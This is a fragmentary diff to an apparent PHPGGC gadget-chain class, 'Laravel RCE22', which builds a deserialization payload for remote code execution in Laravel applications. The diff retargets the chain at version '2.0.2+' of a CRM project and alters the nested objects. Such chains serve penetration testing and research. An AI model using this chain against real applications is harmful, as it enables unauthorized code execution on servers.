@@ -4,9 +4,10 @@ namespace GadgetChain\Laravel;
 
 class RCE22 extends \PHPGGC\GadgetChain\RCE\FunctionCall
 {
-    public static $version = '5.1.*';
+    public static $version = '2.0.2+';
     public static $vector = '__destruct';
     public static $author = 'mcdruid';
+    public static $information = 'https://github.com/krayin/laravel-crm';
 
     public function generate(array $parameters)
     {
@@ -15,7 +16,6 @@ class RCE22 extends \PHPGGC\GadgetChain\RCE\FunctionCall
 
         return new \Illuminate\Broadcasting\PendingBroadcast(
             new \League\CommonMark\Environment\Environment(
-                $function,
                 new \League\CommonMark\Util\PrioritizedList(
                     new \League\CommonMark\Event\ListenerData(
                         new \Illuminate\Support\Testing\Fakes\ChainedBatchTruthTest(
